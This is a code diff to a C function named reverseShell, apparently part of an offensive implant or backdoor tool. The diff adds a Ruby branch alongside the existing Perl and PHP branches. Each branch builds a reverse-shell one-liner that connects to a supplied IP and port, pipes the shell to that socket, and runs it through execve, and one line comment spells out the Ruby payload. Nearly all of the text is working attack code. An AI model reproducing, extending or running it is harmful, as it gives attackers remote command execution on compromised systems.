@@ -301,7 +301,14 @@ void reverseShell(int socket,char* ip, char* port, char* prog){
             args[2] = (char*) malloc(2048);
             sprintf(args[2],"use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};",ip,port);
             execve(args[0], args, NULL);
-        }else{
+        }else if (!strcmp(prog,"ruby")) {
+            //ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+            char* args[] = {"/usr/bin/ruby", "-rsocket", "-e", "", NULL};
+            args[3] = (char*) malloc(2048);
+            sprintf(args[3],"exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end",ip,port);
+            execve(args[0], args, NULL);
+        }
+        else{
             char* args[] = {"/usr/bin/php", "-r", "", NULL};
             args[2] = (char*) malloc(2048);
             sprintf(args[2],"$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");",ip,port);
